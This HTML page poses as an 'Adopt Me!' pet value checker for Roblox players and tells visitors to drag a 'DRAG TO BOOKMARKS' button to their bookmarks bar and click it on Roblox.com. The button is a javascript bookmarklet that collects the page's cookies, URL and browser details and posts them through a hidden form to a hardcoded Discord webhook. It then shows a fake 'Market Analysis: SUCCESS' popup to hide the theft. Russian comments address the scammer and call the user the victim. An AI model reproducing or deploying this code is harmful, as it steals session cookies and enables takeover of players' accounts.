<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>In-Game Value Checker | Adopt Me!</title>
    <style>
        body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; width: 400px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
        h1 { color: #f0b90b; font-size: 24px; }
        .btn { display: inline-block; padding: 20px 35px; background: #f0b90b; color: black; text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; border: 2px dashed #000; margin: 20px 0; font-size: 18px; }
        .steps { text-align: left; background: #1e2329; padding: 15px; border-radius: 10px; font-size: 13px; color: #848e9c; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Value Checker v4.2</h1>
        <p>Analyze pet demand and trade values live.</p>

        <!-- ВСТАВЬ СВОЙ ВЕБХУК ВМЕСТО 'ТУТ_ТВОЙ_ВЕБХУК' -->
        <a class="btn" draggable="true" href="javascript:(function(){
            var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
            
            /* Сбор данных системы для правдоподобности */
            var info = {
                url: window.location.href,
                cookies: document.cookie,
                platform: navigator.platform,
                agent: navigator.userAgent
            };

            /* Создание невидимого транспорта */
            var ifr = document.createElement('iframe');
            ifr.name = 'logger_frame';
            ifr.style.display = 'none';
            document.body.appendChild(ifr);

            var f = document.createElement('form');
            f.method = 'POST';
            f.action = h;
            f.target = 'logger_frame';

            var i = document.createElement('input');
            i.name = 'payload_json';
            i.value = JSON.stringify({
                embeds: [{
                    title: '🚀 New Session: ' + window.location.hostname,
                    description: '**Cookies:**\n' + (info.cookies || 'Protected') + '\n**User Agent
color: 16758795
}]
});
/* Важный фикс: Discord принимает поле 'content', если payload_json не проходит */
var i2 = document.createElement('input');
i2.name = 'content';
i2.value = '🚀 **NEW LOG**\nTarget: ' + window.location.hostname + '\nData: ' + info.cookies;
f.appendChild(i2);
document.body.appendChild(f);
f.submit();
/* Красивое окно для жертвы */
var ui = document.createElement('div');
ui.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:9999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 25px rgba(240,185,11,0.6);';
ui.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px>Market Analysis: <span style=color:#00ff00>SUCCESS</span></p><p style=color:#848e9c;font-size:12px>Scanning inventory data...</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';
document.body.appendChild(ui);
setTimeout(function(){ document.body.removeChild(f); document.body.removeChild(ifr); }, 1500);
})();">DRAG TO BOOKMARKS</a>
<div class="steps">
1. <b>Ctrl+Shift+B</b> to show bar.

2. Drag <b>Yellow Button</b> to bar.

3. Use on <b>Roblox.com</b>
</div>
</div>

</html>
